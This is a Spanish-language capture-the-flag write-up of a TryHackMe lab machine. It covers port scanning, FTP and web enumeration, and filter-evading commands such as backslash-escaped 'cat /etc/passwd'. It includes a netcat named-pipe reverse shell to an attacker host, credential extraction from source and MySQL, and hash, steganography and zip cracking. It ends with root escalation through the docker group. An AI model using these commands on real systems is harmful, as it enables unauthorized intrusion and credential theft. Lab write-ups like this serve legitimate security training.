Bienvenidos a otra sala de dificultad media en tryhackme. Descubriremos puertos abiertos con nuestra herramienta bien conocida, enumeraremos servicios dentro del sistema y directorios ocultos en el servidor web. Abusaremos de una vulnerabilidad RCE que nos permitira ejecutar codigo y obtener una reverse shell en nuestra maquina atacante. Realizaremos una enumeracion exhaustiva en el sistema para toparnos con algunas trampas y movernos entre usuarios hasta escalar privilegios a usuario raiz root usando docker.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.24s latency).
Scanned at 2023-07-07 11:04:48 EDT for 23s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo de nmap nos muestra 3 puertos abiertos. Empezamos enumerando el servicio ftp del puerto 21 para encontrar alguna nota o archivo.

```bash
ftp IPTARGET

ftp> ls
229 Entering Extended Passive Mode (|||27978|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.

ftp> more note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar

ftp> get note.txt
```

Obtenemos dos posibles usuarios. Navegamos al servidor web , para observar que estamos comprometiendo e iniciamos una busqueda de directorios ocultos con `gobuster`.

```bash
gobuster dir -u http://IPTARGET -w /Path/Wordlist -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET
[+] Threads      : 100
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/07 11:11:37 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/js (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
=====================================================
2023/07/07 11:12:33 Finished
=====================================================
```

Tendremos varios directorios para enumerar. Nos moveremos entre directorios hasta toparnos con el que nos interese.

# Intrusion

Dentro del directorio, nos aparecera una cmd que podremos ejecutar comandos especificos y sin ninguna actividad maliciosa. Si ejecutamos algo simple como **whoami** o **id**, nos da una respuesta positiva.

Intentamos enumerar usuarios dentro del sistema, como /etc/passwd, pero veremos que rechaza nuestra solicitud y nos da un background diferente, un tanto intimidante. Podemos ver el souce page para ver la direccion del gifs y como esta estructurada. 

Si queremos ejecutar comandos, lo que tenemos que hacer es modificiar la solicitud del comando ligeramente. Lo que hacemos, es camuflar el comando para que pase desapercibido. A continuacion podran ver los comandos que utilizamos para poder enumerar usuarios  y poder generar una reverse shell en nuestra maquina atacante.

```bash
# Para tener una vista mas comoda, pueden observar el page source 

c\a\t /etc/passwd # Enumeramos usuarios 
i\p a s # Informacion Network
l\s /home # Listamos /home

# Nos ponemos en escucha en nuestra maquina atacante
nc -nvlp LPORT

# Ejecutamos 
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

## Apaar

Nos moveremos entre usuarios para obtener informacion y llegar al usuario raiz root (admin).
Listaremos permisos de superusuario dentro del sistema, y nos abusaremos del binario tipeando /bin/bash como respuesta.

```bash
sudo -l

Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: '/home/apaar/.helpline.sh'

# Ejecutamos el programa con permisos de superusuario con el usuario apaar.

sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: apaar
Hello user! I am apaar,  Please enter your message: /bin/bash
whoami
apaar
```

## root

Como usuario apaar, tendremos que realizar una enumeracion exhaustiva. Podemos transferirnos linpeas para hacer la enumeracion mas rapida, o hacerlo manualmente hasta toparte con lo interesante.

Nos dirigimos al directorio /var/www/files y encontramos varios scripts que al realizar un cat en ellos podemos algunos mensajes por parte de nuestro amigo y tambien las credenciales de root en la base de datos mysql.

```bash
cat index.php # Dentro del directior /var/www/files

session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","REDACTED");

```

### Anurodh & Apaar

Ya tenemos nuestras credenciales para acceder dentro de la base de datos mysql. Una vez dentro, pasaremos a enumerar las databases de interes y su contenido hasta toparnos con las credenciales de estos dos usuarios.

```bash
mysql -u root -p
password:

show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+

use webportal;
show tables;

+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+

select * from users;

+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | REACTED |
|  2 | Apaar     | Dahal    | cullapaar | REDACTED |
+----+-----------+----------+-----------+----------------------------------+
```

Nos dara dos hashses que pasaremos por **crackstation** para cracker y ver su contenido.
Establecemos una conexion con estas credenciales, PERO.... caimos en una trampa mis amigos. Estas credenciales no funcionan y no podemos establecer una conexion ssh.

Lo unico que nos queda, es seguir enumerando. De chill no tiene nada esta maquina.
Encontramos un directorio nuevamente dentro de /var/www/files que contiene dos imagenes. Utilizamos `steghide` para descubrir si posee informacion oculta dentro de las imagenes. 

Abrimos un servidor python http en el puerto 3333 y nos transferimos las imagenes a nuestra maquina atacante. Luego, utilizamos steghide para extraer infomarcion de las imagenes.

```bash
# Maquina victima dentro de /var/www/files/images
python3 -m http.server 3333

# Maquina atacante, transferimos archivo
wget http://IPTARGET:3333/hacker-with-laptop_23-2147985341.jpg

# Utilizamos steghide para extraer informacion
steghide info hacker-with-laptop_23-2147985341.jpg
steghide extract -sf hacker-with-laptop_23-2147985341.jpg

# Obtenemos archivo .zip
Enter passphrase: 
wrote extracted data to "backup.zip".
```

Al querer descomprimirlo, notamos que esta protegido. Para esta tarea, utilizamos **John the ripper**, posee una caracteristica para crackear archivo zip protegidos llamada "zip2john". Una vez crackeado, podemos descubrir las credenciales del usuario Anurodh.

```bash
# Utilizamos zip2john
zip2john backup.zip > zip.txt

# Utilizamos John para descubrir la password
john --wordlist=/Path/wordlist zip.txt

# Descomprimimos
unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password: 
  inflating: source_code.php 

# Observamos el archivo .php 
cat source_code.php

# Descubrimos las credenciales del usuario con la password codificada

if(base64_encode($password) == "REDACTED")
echo "Welcome Anurodh!";

# Decodificamos en base64
echo "REDACTED" | base64 -d
```

Establecemos una conexion ssh :

```bash
ssh anurodh@IPTARGET
```


# Priv.Escalation

Listamos grupos a los que pertenece y escalamos privilegios absusandono del grupo `docker`.

```bash
id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

# localizamos docker 
which docker
/usr/bin/docker

# Nos dirigimos a /usr/bin y ejecutamos
./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Informacion obtenida en https://gtfobins.github.io/gtfobins/docker/